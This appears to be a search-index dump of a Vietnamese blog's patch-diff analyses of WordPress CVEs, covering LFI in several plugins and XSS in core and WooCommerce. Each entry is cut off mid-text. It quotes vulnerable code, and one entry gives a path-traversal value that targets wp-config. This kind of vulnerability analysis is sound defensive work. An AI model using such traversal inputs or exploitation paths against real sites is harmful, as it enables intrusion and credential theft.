Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } Bản lỗi chỉ lọc ký tự HTML bằng sanitize_text_field(), không giới hạn đường dẫn, nên attacker có thể chèn ../ hoặc tên file bất kỳ =\u003e LFI. Bản vá: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } Bản vá áp dụng sanitize_file_name() + whitelist kiểm tra hợp lệ, giúp khóa chặt input và loại bỏ hoàn toàn khả năng khai thác thông qua tham số template. Vulnerable Code Hàm motors_ew_grid_tabs() được đăng ký làm callback cho action hook có tên \"grid_tabs_widget\" thông qua đoạn mã: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); Tiền tố wp_ajax_nopriv_ cho biết action này không yêu cầu người dùng đăng nhập khi gọi đến endpoint AJAX. Do đó, endpoint thực tế có thể được truy cập công khai qua: /wp-admin/admin-ajax.php?action=grid_tabs_widget Khi đó motors_ew_grid_tabs() được gọi: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } Trong hàm motors_ew_grid_tabs(), dòng đầu tiên: check_ajax_referer( 'motors_grid_tabs', 'security' ); thực hiện kiểm tra nonce để bảo vệ khỏi CSRF (Cross-Site Request Forgery). Nếu nonce gửi từ client không hợp lệ hoặc không tồn tại, hàm này sẽ dừng toàn bộ quá trình xử lý AJAX - nghĩa là các đoạn logic phía sau (bao gồm xử lý $template, truy vấn bài viết, và render HTML) sẽ không được thực thi. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' ); // other logic wp_localize_script( 'jquery', 'mew_nonces', array( 'motors_grid_tabs' =\u003e $grid_tabs_widget, // other logic )","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Geo Mashup phiên bản ≤ 1.13.16 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) và 1.13.17 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base được lấy trực tiếp từ $_GET['template'] không qua bất kỳ kiểm tra/sanitize nào. Kết quả được truyền vào GeoMashup::locate_template() rồi dùng load_template() - khả năng kẻ tấn công kiểm soát đường dẫn file để include. Bản vá: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() được áp dụng cho template =\u003e loại bỏ các ký tự không an toàn, ngăn ../, \\, và các ký tự đặc biệt làm giảm nguy cơ path traversal và LFI từ tham số template. Vulnerable Code Ta phân tích logic trong GeoMashup::locate_template() có ảnh hưởng gì đến $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template được gán lại giá trị bằng cách gọi locate_template() thuộc file template.php với đối số geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } Các logic liên quan đến sự tồn tại của file khi concat với $template_name được xử lý, nếu không tồn tại thì trả về chuỗi rỗng '' Các logic liên quan đến sự tồn tại của file Khi attack gửi $_GET['template'] chứa ../ thì mặc định file luôn không tồn tại, luôn trả về '' Quay trở lại GeoMashup::locate_template(), khi $template_name empty và không tồn tại (!is_readable($template)) thì được gán lại giá trị và trả về. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php 👉 GeoMashup::locate_template() không ảnh hưởng đến $template_base do ta kiểm soát, ta tiến hành tìm cách kích hoạt sự kiện này if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { GeoMashupQuery::generate_location_json( ); } else { GeoMashupQuery::gen","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage phiên bản ≤ 19.11.0 chứa lỗ hổng Local File Inclusion (CVE-2025-53328, CVSS 7.5) cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Quan trọng Mặc dù lỗ hổng được công bố là Unauthenticated, trong thực tế việc khai thác đòi hỏi kẻ tấn công có quyền nội bộ tối thiểu — ví dụ tài khoản Contributor hoặc quyền tương đương trên WordPress Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) và 19.11.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Bản lỗi: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); $view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } Trong phiên bản vulnerable, page param được lấy từ $_REQUEST do người dùng kiểm soát nhưng không xác minh hợp lệ của tên file =\u003e Cho phép Local File Inclusion. Trong hàm này chỉ có các logic loại bỏ các ký tự HTML bằng sanitize_text_field và kiểm tra tiền tố opinionstage- sau đó loại bỏ tiền tố và thay - bằng _ nên attacker có thể truyền: ?page=opinionstage-../../wp-config Bản vá: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return ''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } Bản vá đã bổ sung nhiều lớp bảo vệ như kiểm tra kiểu dữ liệu, xác minh prefix \"opinionstage-\", áp dụng whitelist (self::$allowed_templates), ngăn traversal ký tự nguy hiểm Vulnerable Code Hàm prepare_view_file_name_form_current_page() được gọi từ load_template() public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() được gọi với đối số 'admin/views/'.$view_file_name public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } require() hàm chính gây LFI được gọi với đối số $path là giá trị concat từ đường dẫn của plugin (plugin_path), $template_name, .php public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Op","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng Stored Cross Site Scripting(XSS) xảy ra trên WordPress Core trước phiên bản 6.8.3. Nguyên nhân do sai xử lý đầu vào khi sinh trang web động, tác động đến chức năng tạo menu (nav menus) CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Wordpress Core Versions: v6.8.2 (vulnerable) và v6.8.3 (patched). Diff Tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Theme - Astra: Theme rất phổ biến với người dùng WordPress, hỗ trợ tạo nav memu nhanh chóng. Analysis WordPress là phần mềm mã nguồn mở, có kho lưu trữ nằm ở github nên ta có thể tìm đến commit liên quan đến sự kiện vá lỗ hổng XSS để quan sát sự thay đổi, hiểu được lỗ hổng xảy ra ở đâu. Patch diff Bản lỗi: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, Trong phiên bản lỗi, giá trị menuTitle được chèn vào thẻ \u003coption\u003e và được hiển thị ra HTML bằng phương thức html() của jQuery mà không có bất kỳ cơ chế ngăn chặn XSS nào. Hàm html() dùng để thay thế nội dung HTML bên trong phần tử hiện tại, nên nếu menuTitle chứa mã độc thì mã đó sẽ được thực thi trên trình duyệt. Bản vá: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { parentDropdown.append( $( '\u003coption\u003e'","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WooCommerce Plugin.","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin WooCommerce cho WordPress có lỗ hổng Cross-Site Scripting (XSS) dựa trên PostMessage thông qua trang ‘customize-store’ ở tất cả các phiên bản đến và bao gồm 9.4.2, do việc xử lý dữ liệu PostMessage chưa đủ an toàn (không lọc đầu vào và không escape dữ liệu khi xuất ra). Điều này cho phép kẻ tấn công không cần xác thực chèn các đoạn script tùy ý vào trang web, mà sẽ thực thi nếu họ lừa được người dùng thực hiện một hành động, ví dụ như click vào một liên kết. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) và 9.4.3 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Trong phiên bản vulnerable, attachParentListeners() lắng nghe tất cả các message từ bất kỳ nguồn nào mà không kiểm tra origin, dữ liệu từ message được gán trực tiếp vào DOM dẫn đến nguy cơ PostMessage-Based XSS (sub-type của DOM-based XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.2”} Trong phiên bản patched, mã đã bổ sung nhiều lớp kiểm tra và hạn chế so với phiên bản vulnerable, chuyển từ “chấp nhận mọi message và redirect thẳng” sang “chỉ chấp nhận message đáng tin, xác thực cấu trúc và kiểm tra URL trước khi điều hướng” export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.3”} Diff — So sánh thay đổi mã nguồn giữa phiên bản vulnerable và bản patched Vulnerable code Tuy đã tìm ra source và sink, nhưng khi phân tích mã nguồn của plugin sau khi upload tôi lại không tìm được hàm attachParentListeners() Kết quả tìm kiếm attachParentListeners() Tôi nghĩ mình đã setup sai nên code không được tải về đầy đủ. Nhưng không, khi tìm với từ khóa \"navigate\" tôi nhận được hàm khác tên có chức năng tương tự attachParentListeners() Kết quả tìm kiếm ’navigate' 👉 Trong bản product, để tối ưu hóa thời gian tải dữ liệu về trình duyệt, plugin đã dùng kỹ thuật minification loại bỏ khoảng trắng, đặt tên hàm, biến ngắn và một phần obfuscation làm cho mã khó đọc hơn. File được tải về có tên 5292.js chứ không phải utils.js. Sau khi làm đẹp code, tôi thấy 5292.js chứa mã của utils.js và nhiều mã từ các file khác. Truy cập trang customize-store và thử gửi postMessage bằng console của trình duyệt http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store Sự k","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info WordPress Core dễ bị Stored Cross-Site Scripting thông qua tên hiển thị người dùng trong Avatar block ở nhiều phiên bản đến 6.5.2 do insufficient output escaping trên display name. Điều này cho phép authenticated attackers, có quyền contributor-level access trở lên, inject arbitrary web scripts vào các trang — những script này sẽ thực thi mỗi khi người dùng truy cập trang đã bị chèn. Ngoài ra, nó cũng cho phép unauthenticated attackers inject arbitrary web scripts vào những trang có comment block và hiển thị comment author’s avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) và 6.4.4 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Trong phiên bản vulnerable, WP Core đã sử dụng esc_attr__() để dịch chuỗi và escape HTML attribute trước khi hiển thị ra browser, nhưng đã triễn khai sai cách. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; esc_attr__() sau khi dịch chuỗi và escape HTML thì mới đưa vào sprintf() để chèn biến $author_name =\u003e $author_name không được xử lý. Trong phiên bản patched, $author_name được đưa vào sprintf() trước và sau đó mới được escape HTML bằng esc_attr() =\u003e an toàn trước XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; So sánh sự thay đổi giữa bản lỗi và bản vá Vulnerable code function render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] ) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } Avatar block là 1 block của Block Editor dùng để tạo nội dung cho post hoặc comment trong WordPress. $author_name là display_name của author có $author_id thuộc về post hiện tại. Nếu đây là post và có link thì $author_name chứa payload sẽ thêm vào attribute aria-label và hiển thị ra trình duyệt. Khi truy cập một post bất kỳ, wp() được gọi là lấy dữ liệu của post đó. Nơi bắt đầu lấy dữ liệu từ post hiện tại function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } Tại đây $wp_query mới được tạo và nó sẽ chứa giá trị của wp_post sau khi query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() sẽ parse_request và thực hiện query lấy thông tin post hiện tại bằng query_posts() Lấy thông tin post bằng query_post() $wp_the_query là đối tượng WP_Query chính của WordPress, còn $wp_query chỉ đơn giản là một tham chiếu (reference) trỏ đến $wp_the_query. Vì vậy, khi $wp_the_query đã được khởi tạo và có dữ liệu, thì $wp_query cũng sẽ có cùng giá trị. Giá trị tham chiếu của $wp_query Ta có được giá trị post_content: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar thuộc loại block core/avatar Hàm render() sẽ gọi đến call_user_func() với callback là render_block_core_av","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:0:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info WP Statistics – The Most Popular Privacy-Friendly Analytics Plugin cho WordPress mắc lỗ hổng Stored Cross-Site Scripting (XSS) qua User-Agent Header trong tất cả các phiên bản từ trước đến 14.5.4 (bao gồm cả 14.5.4). Nguyên nhân xuất phát từ việc kiểm tra và lọc dữ liệu đầu vào cũng như thoát dữ liệu đầu ra chưa đầy đủ. Lỗ hổng này cho phép kẻ tấn công không cần xác thực chèn các đoạn mã JavaScript độc hại vào hệ thống. Các đoạn mã này sẽ được thực thi mỗi khi người dùng truy cập vào trang có chứa dữ liệu đã bị chèn mã độc, gây ra nguy cơ nghiêm trọng cho bảo mật và quyền riêng tư. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) và v14.15.5 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Tôi đã thiếu sót trong quá trình thu thập thông tin về CVE này, references của https://www.cve.org/CVERecord?id=CVE-2025-9816 chỉ rõ nơi lỗ hỗng xảy ra: includes/admin/templates/pages/devices/models.php{: .filepath} Nhưng tôi đã bỏ qua nó và sử dụng Meld để so sánh code. Do code thay đổi khá nhiều nên tôi đã chủ động tìm các file liên quan đến user-agent Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá Và code thay đổi trong UserAgent.php{: .filepath} làm tôi tin rằng lỗ hỗng thực sự xảy ra ở đây. Diff — Sự thay đổi mã trong UserAgent.php Nó làm tôi tốn khá nhiều thời gian nhưng chưa thể phân tích được. Tuy nhiên, việc này cũng giúp ích cho quá trình phân tích. 🍀 May mắn thay, dưới sự hướng dẫn của các tiền bối, tôi đã focus vào đúng vào vị trí lỗ hổng. Nên quá trình phân tích trở nên dễ dàng hơn. Tip: Đây là lỗ hổng Cross Site Script diễn ra ở trình duyệt của nạn nhân nên ta cần tìm nơi render và trả về HTML. Patch diff Lỗ hổng xảy ra trong file includes/admin/templates/pages/devices/models.php{: .filepath} tại dòng 31. Trong phiên bản vulnerable, $item-\u003emodel được in ra HTML nhưng không có cơ chế bảo vệ nào \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e Trong phiên bản patched, $item-\u003emodel đã được bảo vệ bằng cách đặt nó vào esc_attr() và esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e 👉 Bản vá bổ sung lớp lọc đầu vào cho $item-\u003emodel, đảm bảo nó sẽ được escape trước khi in ra HTML. Diff — Sự thay đổi mã trong models.php Vulnerable code \u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : 